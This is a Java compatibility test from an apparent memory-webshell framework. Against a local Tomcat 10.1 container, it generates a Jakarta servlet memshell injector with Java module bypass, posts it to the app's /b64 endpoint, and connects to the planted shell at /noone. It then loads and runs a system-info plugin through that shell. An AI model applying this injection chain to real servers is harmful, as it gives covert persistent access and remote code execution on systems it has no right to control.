package com.reajason.noone.test.compatibility.tomcat;


import com.alibaba.fastjson2.JSONObject;
import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.noone.core.Constants;
import com.reajason.noone.core.JavaConnection;
import com.reajason.noone.core.client.HttpClient;
import com.reajason.noone.core.client.HttpClientConfig;
import com.reajason.noone.core.generator.JavaMemShellGenerator;
import com.reajason.noone.core.generator.config.NoOneConfig;
import com.reajason.noone.core.profile.Profile;
import com.reajason.noone.test.compatibility.ProfileFactory;
import com.reajason.noone.test.compatibility.WebAppFile;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.Test;
import org.objectweb.asm.Opcodes;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * reajason/tomcat:5-jdk6
 * reajason/tomcat:6-jdk6
 * tomcat:7.0.85-jre7
 * tomcat:8-jre8
 * tomcat:9-jre9
 * tomcat:10.1-jre11
 * tomcat:11.0-jre17
 * tomcat:11.0-jre21
 */
@Slf4j
@Testcontainers
public class Tomcat10CompatibilityTest {
    @Container
    public static final GenericContainer<?> container = new GenericContainer<>("tomcat:10.1-jre11")
            .withCopyToContainer(WebAppFile.jakartaWar, "/usr/local/tomcat/webapps/app.war")
            .waitingFor(Wait.forHttp("/app"))
            .withExposedPorts(8080);

    @Test
    @SneakyThrows
    void test() {
        JavaMemShellGenerator javaMemShellGenerator = new JavaMemShellGenerator();

        ShellConfig shellConfig = ShellConfig.builder()
                .shellTool(Constants.NO_ONE)
                .shellType(ShellType.JAKARTA_SERVLET)
                .server(Server.Tomcat)
                .targetJreVersion(Opcodes.V11)
                .byPassJavaModule(true)
                .debug(true)
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder()
                .urlPattern("/noone")
                .build();

        Profile coreProfile = ProfileFactory.get();
        NoOneConfig noOneConfig = NoOneConfig.builder()
                .coreProfile(coreProfile)
                .build();

        MemShellResult generate = javaMemShellGenerator.generate(shellConfig, injectorConfig, noOneConfig);
        String injectorBytesBase64Str = generate.getInjectorBytesBase64Str();

        String host = container.getHost();
        Integer port = container.getMappedPort(8080);
        String url = "http://" + host + ":" + port + "/app";

        HttpClient httpClient = new HttpClient(url + "/b64", HttpClientConfig.builder()
                .contentType("application/x-www-form-urlencoded")
                .build());
        byte[] response = httpClient.send(("data=" + URLEncoder.encode(injectorBytesBase64Str, Charset.defaultCharset())).getBytes(StandardCharsets.UTF_8));
        System.out.println(new String(response));
        assertNotNull(response);

        HttpClient coreClient = new HttpClient(url + "/noone", HttpClientConfig.builder()
                .requestHeaders(Map.of("No-One-Version", "V1"))
                .contentType("application/json; charset=utf-8")
                .build());
        JavaConnection conn = new JavaConnection(coreClient, coreProfile);
        boolean test = conn.test();
        assertTrue(test);
        byte[] bytes = Files.readAllBytes(Paths.get("..", "..", "noone-plugins/release/java/java-system-info-plugin-0.0.1.json"));
        JSONObject jsonObject = JSONObject.parseObject(new String(bytes, StandardCharsets.UTF_8));
        String pluginId = jsonObject.getString("id");
        conn.loadPlugin(pluginId, jsonObject.getString("version"), Base64.getDecoder().decode(jsonObject.getString("payload")));
        Map<String, Object> result = conn.runPlugin(pluginId, new HashMap<>());
        log.info("result: {}", result);
        assertNotNull(result);
    }
}
